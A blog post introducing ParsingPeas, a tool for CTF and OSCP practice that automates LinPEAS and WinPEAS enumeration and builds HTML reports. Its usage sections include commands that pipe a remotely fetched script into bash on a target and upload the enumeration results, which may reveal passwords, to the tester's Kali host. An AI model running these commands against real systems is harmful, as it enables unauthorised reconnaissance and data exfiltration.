---
layout: post
title: "ParsingPeas: Automating LinPEAS Collection"
date: 2026-02-02 00:05:00 +0200
categories:
  - tools
  - automation
tags:
  - linpeas
  - enumeration
  - oscp
  - ctf
  - python
featured_image: /assets/images/parsingpeas-logo.png
---

I wasted 2 hours on extra enumeration because I missed a finding in WinPEAS output. That was the breaking point. I built [ParsingPeas](https://github.com/YuvalMil/ParsingPeas) to fix this.

## The Problem

During OSCP prep, I was solving multiple boxes daily. The workflow sucked:
- Transfer LinPEAS manually
- Run the scan
- Scroll through thousands of colored lines in the terminal
- Miss important findings
- Copy-paste output somewhere for later review
- Lose track of which output belongs to which box

I actually tried another tool from GitHub that generates HTML reports, but it required multiple steps to get a working page. That defeated the purpose.

## The Solution

One command on target:
```bash
curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
```

LinPEAS runs, results transfer automatically, HTML report generates. Done.

## How It Works

**On Kali:**
```bash
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas
./setup.sh
python3 receiver.py
```

**Architecture:**
- `receiver.py` - HTTP server that hosts binaries and receives results
- `parser.py` - Parses ANSI output, categorizes findings
- `wrapper.sh/ps1` - Runs scan, uploads results automatically

Target doesn't need internet. Everything goes through your Kali box.

## Features

**One-liner execution**
The whole point was making it actually worth using. One command, that's it.

**HTML reports:**
- Categorized sections (SUID, Cron, Network, Passwords, etc.)
- Preserved ANSI colors (hardest part to get right)
- Jump navigation between sections
- Full terminal view

**Multi-session support**
Each scan gets its own report by hostname + timestamp.

**Sudo hang fix**
Discovered this while testing via SSH. LinPEAS would hang on `sudo -l` waiting for password. Wrapper patches it:
```bash
alias sudo='sudo -n'
export SUDO_ASKPASS=/bin/false
```

**Works offline**
Perfect for pivoted networks or isolated lab environments.

## Usage

### Basic
```bash
# On Kali
python3 receiver.py

# On target
curl -sSL http://10.10.14.5:8000/get-script | bash

# View at http://10.10.14.5:8000
```

### Manual (if curl fails)
```bash
# Target
curl http://10.10.14.5:8000/get-linpeas -o /tmp/lp.sh
chmod +x /tmp/lp.sh
/tmp/lp.sh > /tmp/out.txt

curl -X POST \
  -H "X-Hostname: $(hostname)" \
  -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/out.txt \
  http://10.10.14.5:8000/upload
```

### Parse local files
```bash
python3 parser.py /path/to/linpeas_output.txt
```

## Development

This is my first real tool. I've written scripts and wrappers before, but never built something from scratch and released it.

Had the idea for months but never felt like starting. Then I found myself scrolling through LinPEAS output in the terminal again and just decided I'm doing it.

First version took a few hours but wasn't very good. Added HTML parsing, refined the categorization, got the colors right.

Posted on LinkedIn, got around 700 likes. The GitHub repo hit 69 stars in under a week. Honestly didn't expect that.

## Technical Notes

### ANSI Color Preservation

Hardest problem was keeping colors as close as possible to the original. I know how important color coding is for quickly spotting critical findings.

```python
ansi_pattern = re.compile(r'\x1b\[[0-9;]*m')
red_pattern = re.compile(r'\x1b\[1;31m')  # Critical
yellow_pattern = re.compile(r'\x1b\[1;33m')  # Important

categories = {
    'SUID': ['SUID', 'SGID', 'Capabilities'],
    'Cron Jobs': ['CRON', 'crontab'],
    'Network': ['Interfaces', 'Netstat'],
    # 20+ more
}
```

### WinPEAS Support

Windows has different encoding and header formats:

```powershell
$output = & .\winPEASx64.exe | Out-String
Invoke-RestMethod -Uri "http://$KaliIP:8000/upload" `
  -Method POST `
  -Headers @{"X-Hostname"=$env:COMPUTERNAME; "X-Scan-Type"="winpeas"} `
  -Body $output
```

## Current State

It's working well enough for CTFs. Haven't gotten complaints yet, but I'm sure there are bugs waiting to be discovered as more people use it.

Right now I'm focusing on OSWE prep, but I'll keep updating this. The TODO list is realistic - nothing crazy on there that I won't eventually implement.

## TODO

**High priority:**
- Better WinPEAS categorization
- Search in HTML reports
- User context display (root vs standard user)

**Medium:**
- Export to JSON/CSV
- Compare two reports side-by-side
- Better filename format

**Low:**
- Dark theme
- Bookmarks
- Timeline view

## Links

- [GitHub](https://github.com/YuvalMil/ParsingPeas)
- [Issues](https://github.com/YuvalMil/ParsingPeas/issues)
- [PRs welcome](https://github.com/YuvalMil/ParsingPeas/pulls)

Built on [PEASS-ng](https://github.com/peass-ng/PEASS-ng) by [@carlospolop](https://github.com/carlospolop). MIT licensed.
